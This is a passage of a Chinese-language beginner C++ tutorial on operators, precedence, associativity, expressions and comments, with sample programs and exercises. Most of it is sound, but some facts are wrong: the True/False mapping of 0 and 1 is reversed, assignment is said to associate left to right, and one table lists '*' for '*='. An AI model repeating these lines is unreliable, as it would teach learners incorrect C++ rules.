cout&lt;&lt;<span class="string">&quot;2=&quot;</span>&lt;&lt;x-z&lt;&lt;endl; <span class="comment">//5-5</span></span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;3=&quot;</span>&lt;&lt;x*z&lt;&lt;endl; <span class="comment">//5*5</span></span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;4=&quot;</span>&lt;&lt;y/z&lt;&lt;endl; <span class="comment">//4/5取商 //這裡的z是浮點數</span></span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;5=&quot;</span>&lt;&lt;x/y&lt;&lt;endl; <span class="comment">//5/4取商 //若不是浮點數不會輸出小數後位數</span></span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;6=&quot;</span>&lt;&lt;x%y&lt;&lt;endl; <span class="comment">//5/4取餘數</span></span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;7=&quot;</span>&lt;&lt;-x+y/z&lt;&lt;endl; <span class="comment">//-5+4/5</span></span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;8=&quot;</span>&lt;&lt;x-y%y*z&lt;&lt;endl; <span class="comment">//5-4%4*5</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>輸出結果<br>1&#x3D;10<br>2&#x3D;0<br>3&#x3D;25<br>4&#x3D;0.8<br>5&#x3D;1<br>6&#x3D;1<br>7&#x3D;-4.2<br>8&#x3D;5<br>[color&#x3D;#f99]</p>
</blockquote>
<p><font color="#f18"><strong>需要注意C&#x2F;C++語言的算術運算子只有以上那些，若需要運算沒有運算子則需要運用到數學函式</strong></font><br>:::warning<br><strong>例如C++沒有次方運算子(^)與開根號<br>要算次方的話要使用到pow()函式</strong></p>
<blockquote>
<p>a&#x3D;pow(3,2);&#x2F;&#x2F;include&lt;math.h&gt;或<cmath>[color&#x3D;#a77]</p>
</blockquote>
<p><strong>要算根號的話要使用到sqrt()函式</strong></p>
<blockquote>
<p>x&#x3D;sqrt(9)&#x2F;&#x2F;include&lt;math.h&gt;或<cmath>[color&#x3D;#a77]<br>:::</p>
</blockquote>
<h3 id="遞增-及遞減"><a href="#遞增-及遞減" class="headerlink" title="遞增(++)及遞減(- -)"></a>遞增(++)及遞減(- -)</h3><p><code>這兩個運算子又分為前置與後置</code></p>
<h4 id="前置是在運算子之前"><a href="#前置是在運算子之前" class="headerlink" title="前置是在運算子之前"></a>前置是在運算子之前</h4><p>EX:</p>
<blockquote>
<p>a&#x3D;1;<br>++a;<br>cout&lt;&lt;a&lt;&lt;endl;&#x2F;&#x2F;2[color&#x3D;#f90]</p>
</blockquote>
<h4 id="後置是運算子在運算元後"><a href="#後置是運算子在運算元後" class="headerlink" title="後置是運算子在運算元後"></a>後置是運算子在運算元後</h4><p>&#x3D;&#x3D;不論 ++a,a++都是將值加1放回a，但是兩個執行結果還是有差異的&#x3D;&#x3D;<br>EX:</p>
<blockquote>
<p>a&#x3D;1;<br>b&#x3D;++a;&#x2F;&#x2F;先執行a&#x3D;a+1;在執行b&#x3D;a; 輸出 a&#x3D;2 b&#x3D;2[color&#x3D;#a10]</p>
</blockquote>
<h4 id="和"><a href="#和" class="headerlink" title="和"></a>和</h4><blockquote>
<p>a&#x3D;1;<br>b&#x3D;a++;先執行b&#x3D;a;在執行a&#x3D;a+1; 輸出 a&#x3D;2 b&#x3D;1[color&#x3D;#f20]</p>
</blockquote>
<p><strong>其a值均會加1，但b值會有差異，前置b值會得到+1的結果，後者能得到原a值</strong></p>
<h4 id="範例程式-5"><a href="#範例程式-5" class="headerlink" title="範例程式"></a>範例程式</h4><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> a=<span class="number">1</span>;</span><br><span class="line">    <span class="type">int</span> b,d,r,e;</span><br><span class="line">    b=++a;<span class="comment">//a=1+1=2=b</span></span><br><span class="line">    d=++a;<span class="comment">//此時a是2，a=2+1=d</span></span><br><span class="line">    e=a++;<span class="comment">//a還是2，e=a=2，2+1=3=a</span></span><br><span class="line">    r=a++;<span class="comment">//a現在是3，r=a=3，3+1=4=a</span></span><br><span class="line">    cout&lt;&lt;b&lt;&lt;endl;</span><br><span class="line">    cout&lt;&lt;d&lt;&lt;endl;</span><br><span class="line">    cout&lt;&lt;e&lt;&lt;endl;</span><br><span class="line">    cout&lt;&lt;r&lt;&lt;endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<pre><code>輸出結果
2
3
3
4
</code></pre>
<h3 id="關係運算子-Relational-Operator-或稱比較運算子-Comparison-Operator"><a href="#關係運算子-Relational-Operator-或稱比較運算子-Comparison-Operator" class="headerlink" title="關係運算子(Relational Operator)或稱比較運算子(Comparison Operator)"></a>關係運算子(Relational Operator)或稱比較運算子(Comparison Operator)</h3><p><code>用於資料之間的大小比較的結果可得到int型別的1(True)或0(False)</code><br>EX:</p>
<blockquote>
<p>if(a&#x3D;&#x3D;b);&#x2F;&#x2F;比較ab是否相等[color&#x3D;#d48]</p>
</blockquote>
<table>
<thead>
<tr>
<th align="center">運算子</th>
<th align="center">定義</th>
<th align="center">優先順序</th>
<th align="center">結合率</th>
</tr>
</thead>
<tbody><tr>
<td align="center">&lt;</td>
<td align="center">小於</td>
<td align="center">6</td>
<td align="center">由左而右</td>
</tr>
<tr>
<td align="center">&gt;</td>
<td align="center">大於</td>
<td align="center">6</td>
<td align="center">由左而右</td>
</tr>
<tr>
<td align="center">&lt;&#x3D;</td>
<td align="center">小於等於</td>
<td align="center">6</td>
<td align="center">由左而右</td>
</tr>
<tr>
<td align="center">&gt;&#x3D;</td>
<td align="center">大於等於</td>
<td align="center">6</td>
<td align="center">由左而右</td>
</tr>
<tr>
<td align="center">&#x3D;&#x3D;</td>
<td align="center">等於</td>
<td align="center">7</td>
<td align="center">由左而右</td>
</tr>
<tr>
<td align="center">!&#x3D;</td>
<td align="center">不等於</td>
<td align="center">7</td>
<td align="center">由左而右</td>
</tr>
</tbody></table>
<h4 id="範例程式-6"><a href="#範例程式-6" class="headerlink" title="範例程式"></a>範例程式</h4><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> a,b,c;</span><br><span class="line">    a=<span class="number">7</span>&gt;<span class="number">3</span>;</span><br><span class="line">    cout&lt;&lt;a&lt;&lt;endl;<span class="comment">//T</span></span><br><span class="line">    a=<span class="number">3</span>&gt;=<span class="number">7</span>;</span><br><span class="line">    cout&lt;&lt;a&lt;&lt;endl;<span class="comment">//F</span></span><br><span class="line">    b=<span class="number">7</span>;</span><br><span class="line">    c=<span class="number">3</span>;</span><br><span class="line">    a=b==c;</span><br><span class="line">    cout&lt;&lt;a&lt;&lt;endl;<span class="comment">//F</span></span><br><span class="line">    b=<span class="number">7</span>;</span><br><span class="line">    c=<span class="number">3</span>;a=b!=c;</span><br><span class="line">    cout&lt;&lt;a&lt;&lt;endl;<span class="comment">//T</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>輸出結果<br>1<br>0<br>0<br>1<br>[color&#x3D;#a08]</p>
</blockquote>
<h3 id="邏輯運算子-Logical-Operator"><a href="#邏輯運算子-Logical-Operator" class="headerlink" title="邏輯運算子(Logical Operator)"></a>邏輯運算子(Logical Operator)</h3><p><code>當同一個運算式要同時存在兩個以上比較運算子，每兩個比較運算子之間必須使用邏輯運算子連結</code></p>
<table>
<thead>
<tr>
<th align="center">運算子</th>
<th align="center">定義</th>
<th align="center">優先順序</th>
<th align="center">結合率</th>
</tr>
</thead>
<tbody><tr>
<td align="center">!</td>
<td align="center">一元邏輯補數運算(NOT)</td>
<td align="center">2</td>
<td align="center">由右而左</td>
</tr>
<tr>
<td align="center">&amp;</td>
<td align="center">完全評估的AND運算</td>
<td align="center">8</td>
<td align="center">由左而右</td>
</tr>
<tr>
<td align="center">^</td>
<td align="center">完全評估的XOR運算</td>
<td align="center">8</td>
<td align="center">由左而右</td>
</tr>
<tr>
<td align="center">|</td>
<td align="center">完全評估的OR運算</td>
<td align="center">8</td>
<td align="center">由左而右</td>
</tr>
<tr>
<td align="center">&amp;&amp;</td>
<td align="center">快捷的AND運算</td>
<td align="center">9</td>
<td align="center">由左而右</td>
</tr>
<tr>
<td align="center">||</td>
<td align="center">快捷的OR運算</td>
<td align="center">9</td>
<td align="center">由左而右</td>
</tr>
</tbody></table>
<h4 id="範例程式-7"><a href="#範例程式-7" class="headerlink" title="範例程式"></a>範例程式</h4><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> a,b,x,y;</span><br><span class="line">    x=<span class="number">5</span>;</span><br><span class="line">    y=<span class="number">4</span>;</span><br><span class="line">    a=x&gt;y &amp; y==<span class="number">3</span>; <span class="comment">//T &amp; F = F</span></span><br><span class="line">    cout&lt;&lt;a&lt;&lt;endl;</span><br><span class="line">    b=x&gt;<span class="number">3</span> || y&lt;<span class="number">5</span>;</span><br><span class="line">    cout&lt;&lt;b&lt;&lt;endl; <span class="comment">//T | T = T</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>輸出結果<br>0<br>1<br>[color&#x3D;#c38]</p>
</blockquote>
<hr>
<h5 id="完全評估系列的運算子-一定會把兩個關係運算子拿來運算"><a href="#完全評估系列的運算子-一定會把兩個關係運算子拿來運算" class="headerlink" title="完全評估系列的運算子&#x3D;&#x3D;一定會把兩個關係運算子拿來運算&#x3D;&#x3D;"></a>完全評估系列的運算子&#x3D;&#x3D;一定會把兩個關係運算子拿來運算&#x3D;&#x3D;</h5><p><em><strong>相反地</strong></em></p>
<h4 id="快捷系列的運算子-會先算出第一個關係運算子的值"><a href="#快捷系列的運算子-會先算出第一個關係運算子的值" class="headerlink" title="快捷系列的運算子&#x3D;&#x3D;會先算出第一個關係運算子的值&#x3D;&#x3D;"></a>快捷系列的運算子&#x3D;&#x3D;會先算出第一個關係運算子的值&#x3D;&#x3D;</h4><p><strong>如果這個值已經可以決定出整個運算式的結果</strong><br><strong>&#x3D;&#x3D;快捷系統的運算子就不會對第二個關係運算子進行運算&#x3D;&#x3D;</strong><br>EX:</p>
<blockquote>
<p>boolean1&#x3D;(3&gt;7)&amp;(5&gt;2);<br>boolean2&#x3D;(3&gt;7)&amp;&amp;(5&gt;2);&#x2F;&#x2F;比boolean1更快完成運算<br>[color&#x3D;#f49]</p>
</blockquote>
<h2 id="範例實作"><a href="#範例實作" class="headerlink" title="範例實作"></a>範例實作</h2><p>:::danger<br>1.若有一數學式，判斷x是否滿足1&lt;x&lt;&#x3D;6，請轉換C&#x2F;C++敘述<br>2.若有一數學式，同時判斷4個變數是否滿足(a1&#x2F;a2)&#x3D;(b1&#x2F;b2)，請轉換C&#x2F;C ++敘述<br>3.(a1&#x2F;a2)&#x3D;(b1&#x2F;b2)!&#x3D;(c1&#x2F;c2)又如何表示<br>(記得要自己打過程式，題目沒有標準答案der)<br>:::</p>
<hr>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//第1題</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> x;</span><br><span class="line">    cin&gt;&gt;x;</span><br><span class="line">    x=x&gt;<span class="number">1</span> &amp; x&lt;=<span class="number">6</span>;</span><br><span class="line">    cout&lt;&lt;x&lt;&lt;endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//第二題</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> a1,a2,b1,b2;</span><br><span class="line">    <span class="type">int</span> A;</span><br><span class="line">    cin &gt;&gt; a1;</span><br><span class="line">    cin &gt;&gt; a2;</span><br><span class="line">    cin &gt;&gt; b1;</span><br><span class="line">    cin &gt;&gt; b2;</span><br><span class="line">  A=(a1/a2) == (b1/b2);</span><br><span class="line">  cout&lt;&lt;A; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//第3題</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> a1,a2,b1,b2,c1,c2;</span><br><span class="line">    cin &gt;&gt; a1;</span><br><span class="line">    cin &gt;&gt; a2;</span><br><span class="line">    cin &gt;&gt; b1;</span><br><span class="line">    cin &gt;&gt; b2;</span><br><span class="line">    cin &gt;&gt; c1;</span><br><span class="line">    cin &gt;&gt; c2;</span><br><span class="line"><span class="keyword">if</span>((a1/a2)==(b1/b2)!=(c1/c2))&#123;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;T&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;F&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<h3 id="複合指派運算子"><a href="#複合指派運算子" class="headerlink" title="複合指派運算子"></a>複合指派運算子</h3><p><code>結合指派與算術、關係、邏輯運算子</code></p>
<p><em><strong>這是C&#x2F;C++特有的運算子</strong></em></p>
<h5 id="EX-2"><a href="#EX-2" class="headerlink" title="EX:"></a>EX:</h5><blockquote>
<p>sum&#x3D;sum+5;<br>又等於<br>sum+&#x3D;5;[color&#x3D;#c87]</p>
</blockquote>
<table>
<thead>
<tr>
<th align="center">運算子</th>
<th align="center">定義</th>
<th align="center">優先順序</th>
<th align="center">結合率</th>
</tr>
</thead>
<tbody><tr>
<td align="center">&#x3D;</td>
<td align="center">指派設定內容</td>
<td align="center">11</td>
<td align="center">由右而左</td>
</tr>
<tr>
<td align="center">+&#x3D;</td>
<td align="center">相加後再設定內容</td>
<td align="center">11</td>
<td align="center">由右而左</td>
</tr>
<tr>
<td align="center">-&#x3D;</td>
<td align="center">相減後再設定內容</td>
<td align="center">11</td>
<td align="center">由右而左</td>
</tr>
<tr>
<td align="center">*</td>
<td align="center">相乘後再設定內容</td>
<td align="center">11</td>
<td align="center">由右而左</td>
</tr>
<tr>
<td align="center">&#x2F;&#x3D;</td>
<td align="center">相除後再設定內容</td>
<td align="center">11</td>
<td align="center">由右而左</td>
</tr>
<tr>
<td align="center">&amp;&#x3D;</td>
<td align="center">AND運算後再設定內容</td>
<td align="center">11</td>
<td align="center">由右而左</td>
</tr>
<tr>
<td align="center">|&#x3D;</td>
<td align="center">OR運算後再設定內容</td>
<td align="center">11</td>
<td align="center">由右而左</td>
</tr>
<tr>
<td align="center">^&#x3D;</td>
<td align="center">XOR運算後再設定內容</td>
<td align="center">11</td>
<td align="center">由右而左</td>
</tr>
</tbody></table>
<hr>
<h3 id="位元操作運算子-Bitwise-Operator"><a href="#位元操作運算子-Bitwise-Operator" class="headerlink" title="位元操作運算子(Bitwise Operator)"></a>位元操作運算子(Bitwise Operator)</h3><p><code>位元(Bitwise)操作運算子是將所運算的整數，先轉為二進制，在逐位元進行運算</code><br><strong>可分為</strong></p>
<blockquote>
<p>位移(shift)運算子與布林運算子<br>位移運算子是逐位元向左或是向右移<br>布林運算子則可以逐位元進行布林運算[color&#x3D;#a347]</p>
</blockquote>
<table>
<thead>
<tr>
<th align="center">運算子</th>
<th align="center">定義</th>
<th align="center">優先順序</th>
<th align="center">結合率</th>
</tr>
</thead>
<tbody><tr>
<td align="center">~</td>
<td align="center">對各位元進行補數運算</td>
<td align="center">2</td>
<td align="center">由右而左</td>
</tr>
<tr>
<td align="center">&lt;&lt;</td>
<td align="center">考慮正負位元的向左位元</td>
<td align="center">5</td>
<td align="center">由左而右</td>
</tr>
<tr>
<td align="center">&gt;&gt;</td>
<td align="center">考慮正負位元的向右位元</td>
<td align="center">5</td>
<td align="center">由左而右</td>
</tr>
<tr>
<td align="center">&amp;</td>
<td align="center">位元AND運算</td>
<td align="center">2</td>
<td align="center">由左而右</td>
</tr>
<tr>
<td align="center">|</td>
<td align="center">位元OR運算</td>
<td align="center">8</td>
<td align="center">由左而右</td>
</tr>
<tr>
<td align="center">^</td>
<td align="center">位元XOR運算</td>
<td align="center">8</td>
<td align="center">由左而右</td>
</tr>
<tr>
<td align="center">&lt;&lt;&#x3D;</td>
<td align="center">向左位移之後再指派內容</td>
<td align="center">11</td>
<td align="center">由左而右</td>
</tr>
<tr>
<td align="center">&gt;&gt;&#x3D;</td>
<td align="center">向右位移之後再指派內容</td>
<td align="center">11</td>
<td align="center">由左而右</td>
</tr>
</tbody></table>
<h4 id="數位邏輯幫大家整理一下"><a href="#數位邏輯幫大家整理一下" class="headerlink" title="數位邏輯幫大家整理一下"></a>數位邏輯幫大家整理一下</h4><pre><code> 0 &gt;&gt;True
 1 &gt;&gt;Falst
</code></pre>
<hr>
<p>:::success<br>     AND  &gt;&gt;遇 0 則 0<br>     NAND &gt;&gt;遇 0 則 1<br>     OR   &gt;&gt;遇 1 則 1<br>     NOR  &gt;&gt;遇 1 則 0<br>     XOR  &gt;&gt;相同為 0 不同為 1<br>     NXOR &gt;&gt;相同為 1 不同為 0<br>:::</p>
<hr>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> i,j,k;</span><br><span class="line">    i=<span class="number">1</span>; <span class="comment">//0000 0001</span></span><br><span class="line">    i=~i;<span class="comment">//1111 1110取2補數</span></span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;1=&quot;</span>&lt;&lt;i&lt;&lt;endl;<span class="comment">//-2(10進制)</span></span><br><span class="line">    i=<span class="number">6</span>;   <span class="comment">//i=00000110</span></span><br><span class="line">    i=i&lt;&lt;<span class="number">2</span>;<span class="comment">//i=00011000</span></span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;2=&quot;</span>&lt;&lt;i&lt;&lt;endl;</span><br><span class="line">    i=i&gt;&gt;<span class="number">3</span>;</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;3=&quot;</span>&lt;&lt;i&lt;&lt;endl;<span class="comment">//i=00000011</span></span><br><span class="line">    i=<span class="number">3</span>;    <span class="comment">//i=00000011</span></span><br><span class="line">    j=<span class="number">2</span>;    <span class="comment">//j=00000010</span></span><br><span class="line">    k=i &amp; j;<span class="comment">//k=00000010//遇0則0</span></span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;4=&quot;</span>&lt;&lt;k&lt;&lt;endl;</span><br><span class="line">    k=i | j;<span class="comment">//k=00000011//遇1則1</span></span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;5=&quot;</span>&lt;&lt;k&lt;&lt;endl;</span><br><span class="line">    k=i ^ j;<span class="comment">//k=00000001//相同為0不同為1</span></span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;6=&quot;</span>&lt;&lt;k&lt;&lt;endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<pre><code>輸出結果
1=-2
2=24
3=3
4=2
5=3
6=1
</code></pre>
<hr>
<h3 id="運算子的優先順序"><a href="#運算子的優先順序" class="headerlink" title="運算子的優先順序"></a>運算子的優先順序</h3><p><code>同一敘述若同時有多個運算子，此時需定義運算子的優先順序</code></p>
<blockquote>
<p>x&#x3D;a+b<em>c;<br>由以上各運算子的「優先順序」可知，乘號(</em>)的優先順序是第4而加號(+)則是第5</p>
</blockquote>
<p><strong>x&#x3D;(a+(b*c));&#x2F;&#x2F;和上述結果相同</strong></p>
<h4 id="同理"><a href="#同理" class="headerlink" title="同理"></a>同理</h4><blockquote>
<p>x&#x3D;a&gt;b &amp; b&gt;z;</p>
</blockquote>
<h4 id="同義"><a href="#同義" class="headerlink" title="同義"></a>同義</h4><blockquote>
<p>x&#x3D;(a&gt;b) &amp; (b&gt;z);</p>
</blockquote>
<h4 id="下面式子左右結果是相同的"><a href="#下面式子左右結果是相同的" class="headerlink" title="下面式子左右結果是相同的"></a>下面式子左右結果是相同的</h4><table>
<thead>
<tr>
<th align="center">x&#x3D;x+++2;</th>
<th align="center">x&#x3D;(x++)+2;</th>
</tr>
</thead>
<tbody><tr>
<td align="center">x&#x3D;x+y*2+z++;</td>
<td align="center">x&#x3D;((x+(y*2))+(z++));</td>
</tr>
<tr>
<td align="center">z&#x3D;x&gt;2 &amp; y&gt;3;</td>
<td align="center">z&#x3D;((x&gt;2)&amp;(y&gt;3));</td>
</tr>
</tbody></table>
<h3 id="範例程式-8"><a href="#範例程式-8" class="headerlink" title="範例程式"></a>範例程式</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> a,b,c;</span><br><span class="line">    <span class="type">int</span> x,y,z;</span><br><span class="line">    x=<span class="number">2</span>;</span><br><span class="line">    x=x++<span class="number">+2</span>;</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;X1=&quot;</span>&lt;&lt;x&lt;&lt;endl;</span><br><span class="line">    x=<span class="number">1</span>;y=<span class="number">3</span>;z=<span class="number">5</span>;</span><br><span class="line">    x=x+y*<span class="number">2</span>+z++;<span class="comment">//1+3*2+5=12，x=12=Z++</span></span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;X2=&quot;</span>&lt;&lt;x&lt;&lt;endl;</span><br><span class="line">    x=<span class="number">1</span>;y=<span class="number">4</span>;</span><br><span class="line">    z=x&gt;<span class="number">2</span> &amp; y&gt;<span class="number">3</span>;</span><br><span class="line">    cout&lt;&lt;z&lt;&lt;endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="運算子的結合律"><a href="#運算子的結合律" class="headerlink" title="運算子的結合律"></a>運算子的結合律</h3><p><code>當同一敘述，相鄰的運算子擁有相同優先順序的運算子，此時即需定運算子是左結合或右結合</code></p>
<blockquote>
<p>x&#x3D;z-b-c;[color&#x3D;#a08]</p>
</blockquote>
<p><strong>同是減號(-)，優先順序相同，此時就要靠定義結合律，減法結合律是由左至右</strong></p>
<blockquote>
<p>x&#x3D;((a-b)-c);[color&#x3D;#a08]</p>
</blockquote>
<h6 id="而"><a href="#而" class="headerlink" title="而"></a>而</h6><blockquote>
<p>x&#x3D;y&#x3D;z&#x3D;2;[color&#x3D;#a08]</p>
</blockquote>
<h6 id="指派運算子的結合律由左至右，上式同義於"><a href="#指派運算子的結合律由左至右，上式同義於" class="headerlink" title="指派運算子的結合律由左至右，上式同義於"></a>指派運算子的結合律由左至右，上式同義於</h6><blockquote>
<p>(x&#x3D;(y&#x3D;(z&#x3D;2)));[color&#x3D;#a08]</p>
</blockquote>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> a,b,c;</span><br><span class="line">    <span class="type">int</span> x,y,z;</span><br><span class="line">    a=<span class="number">2</span>;</span><br><span class="line">    b=<span class="number">3</span>;</span><br><span class="line">    c=<span class="number">4</span>;</span><br><span class="line">    x=a-b-c;</span><br><span class="line">    cout&lt;&lt;x&lt;&lt;endl;</span><br><span class="line">    x=y=z=<span class="number">2</span>;</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;x=&quot;</span>&lt;&lt;x&lt;&lt;endl;</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;y=&quot;</span>&lt;&lt;y&lt;&lt;endl;</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;z=&quot;</span>&lt;&lt;z&lt;&lt;endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<pre><code>輸出結果
-5
x=2
y=2
z=2
</code></pre>
<h1 id="運算式"><a href="#運算式" class="headerlink" title="運算式"></a>運算式</h1><p><code>任何一個可求得一個值的式子，稱為一個運算式(Expression) 例如5+3會回傳一個數值，所以5+3是一個運算式</code><br><strong>這些運算式通常放在cout&lt;&lt;運算式，<font color="#f18">一般而言可以放在等號右邊的東西</font>，都可以稱為運算式</strong></p>
<hr>
<h3 id="敘述-Statement"><a href="#敘述-Statement" class="headerlink" title="敘述(Statement)"></a>敘述(Statement)</h3><h4 id="凡是控制執行的順序、對運算式取值或不做任何事均可稱為敘述"><a href="#凡是控制執行的順序、對運算式取值或不做任何事均可稱為敘述" class="headerlink" title="凡是控制執行的順序、對運算式取值或不做任何事均可稱為敘述"></a>凡是控制執行的順序、對運算式取值或不做任何事均可稱為敘述</h4><p>所有的敘述都要以分號(;)作結束，例如</p>
<blockquote>
<p>sum&#x3D;sum+1;[color&#x3D;#a90467]</p>
</blockquote>
<p><strong>&#x3D;&#x3D;於C&#x2F;C++語言中，若前一個敘述未以分號結束，則錯誤訊息通常會出現在下一個敘述的開頭&#x3D;&#x3D;</strong></p>
<hr>
<h3 id="敘述區塊-Block-Statement-或複合敘述-Compound-Statement"><a href="#敘述區塊-Block-Statement-或複合敘述-Compound-Statement" class="headerlink" title="敘述區塊(Block Statement)或複合敘述(Compound Statement)"></a>敘述區塊(Block Statement)或複合敘述(Compound Statement)</h3><p><code>在任何可以放上單一敘述的地方，你都可以放上敘述區塊，一個複合敘述是由兩個大括號組合而成</code><br><strong><font color="#a08">但大括號後不可再加分號</font></strong></p>
<blockquote>
<p>{<br>    t&#x3D;a;<br>    a&#x3D;b;<br>    b&#x3D;t;<br>}[color&#x3D;#f49]</p>
</blockquote>
<hr>
<h3 id="註解-Comments"><a href="#註解-Comments" class="headerlink" title="註解(Comments)"></a>註解(Comments)</h3><p><code>適當的程式註解才能增加程式可讀性</code></p>
<blockquote>
<p>&#x2F;*我是註解*&#x2F;<br>&#x2F;&#x2F;我是註解[color&#x3D;#c39429]</p>
</blockquote>
<h4 id="上式-符號以後的字串視為註解，編譯程式不予處理，直到遇到-為止"><a href="#上式-符號以後的字串視為註解，編譯程式不予處理，直到遇到-為止" class="headerlink" title="上式&#x2F;*符號以後的字串視為註解，編譯程式不予處理，直到遇到*&#x2F;為止"></a>上式<font color="#f18">&#x2F;*符號以後的字串視為註解，編譯程式不予處理，直到遇到*&#x2F;</font>為止</h4><h4 id="還有同一列中，雙斜線-後面也視為註解，編譯器均不予處理"><a href="#還有同一列中，雙斜線-後面也視為註解，編譯器均不予處理" class="headerlink" title="還有同一列中，雙斜線(&#x2F;&#x2F;)後面也視為註解，編譯器均不予處理"></a>還有同一列中，雙斜線(&#x2F;&#x2F;)後面也視為註解，編譯器均不予處理</h4><blockquote>
<p>x&#x3D;x+3; &#x2F;* x值加3 *&#x2F;<br>sum&#x3D;sum+y; &#x2F;&#x2F;將y值加至sum[color&#x3D;#b499]</p>
</blockquote>
